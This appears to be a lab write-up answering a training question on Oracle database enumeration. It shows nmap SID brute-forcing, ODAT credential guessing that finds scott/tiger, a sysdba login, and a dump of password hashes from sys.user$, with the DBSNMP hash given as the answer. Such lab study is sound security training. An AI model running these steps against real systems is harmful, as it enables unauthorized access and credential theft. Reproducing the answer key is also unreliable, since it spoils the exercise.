## Question 1
>Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

First let's check for SID with nmap NSE `oracle-sid-brute` : 
```shell
sudo nmap -p1521 -sV $ip --open --script oracle-sid-brute
```

Result :
```shell
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE
```
SID : `XE`

Then, let's find some valid credential using `ODAT` : 
```shell
cd ~/odat
./odat.py all -s $ip
```

Results : 
```shell
[+] Target: 10.129.205.19:1521 [all]
[+] Checking if target 10.129.205.19:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.205.19:1521 is well configured. Continue...

[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.205.19:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.205.19:1521 server
[+] 'XE' is a valid SID. Continue...
100% |##########################################################################################################################################| Time: 00:08:13
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |##########################################################################################################################################| Time: 00:00:15
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid SID. Continue...
100% |##########################################################################################################################################| Time: 00:06:41
[+] SIDs found on the 10.129.205.19:1521 server: XE

[3] (10.129.205.19:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.205.19:1521 server
[+] 'XE' is a valid Service Name. Continue...
[+] 'XEXDB' is a valid Service Name. Continue...
100% |##########################################################################################################################################| Time: 00:07:55
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |##########################################################################################################################################| Time: 00:00:14
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid Service Name. Continue...
100% |##########################################################################################################################################| Time: 00:06:40
[+] Service Name(s) found on the 10.129.205.19:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice

[4] (10.129.205.19:1521): Searching valid accounts on the XE SID
The login cis has already been tested at least once. What do you want to do:                                                                    | ETA:  00:23:24
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                  | ETA:  00:23:48
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                  | ETA:  00:22:30
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                     | ETA:  00:20:49
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                      | ETA:  00:16:01
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                                   | ETA:  00:11:57
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password######                                                        | ETA:  00:09:10
[!] Notice: 'outln' account is locked, so skipping this username for password#################                                                  | ETA:  00:08:12
[+] Valid credentials found: scott/tiger. Continue...
```
There is a credential : scott/tiger.

```shell
sqlplus scott/tiger@$ip/XE as sysdba
```

```shell
SQL> select name,password from sys.user$;

NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
...
DBSNMP			       E066D214D5421CCC

```

### Answer : `E066D214D5421CCC`




